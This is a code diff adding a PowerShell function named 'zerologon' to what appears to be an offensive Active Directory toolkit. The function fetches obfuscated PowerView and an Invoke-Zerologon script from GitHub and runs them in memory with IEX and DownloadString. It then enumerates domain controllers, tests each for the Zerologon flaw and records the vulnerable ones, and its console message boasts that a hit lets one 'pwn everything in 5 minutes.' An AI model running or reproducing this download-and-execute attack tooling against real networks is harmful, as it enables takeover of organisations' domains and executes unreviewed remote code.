@@ -2435,6 +2435,54 @@ function Bluekeep
 
 }
 
+function zerologon
+{
+<#
+        .DESCRIPTION
+        Search in AD for Zerologon vulnerable DCs
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput   
+    )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')         
+	Write-Host -ForegroundColor Yellow 'Searching for zerologon vulnerable Domain Controllers - if vulnerable you can pwn everything in 5 minutes.' 
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Zerologon.ps1')
+    $domcontrols = spinster
+        
+        
+    foreach ($domc in $domcontrols.name)
+    {
+        if(!$consoleoutput){$domc > "$currentPath\DomainRecon\DC-FQDN.txt"}
+	 	try{
+
+
+                $Results = Invoke-Zerologon -fqdn $domc
+
+                if (!($Results -eq $null))
+                {
+                    Write-Host "Found vulnerable DC: " 
+                    $domc
+                    if(!$consoleoutput){$domc > "$currentPath\Vulnerabilities\ZerologonvulnerableDC.txt"}
+
+                }
+	       }
+           catch
+           {
+                Write-Host "Got an error"
+           }
+    }
+
+}
+
 function MS17-10
 {
 <#
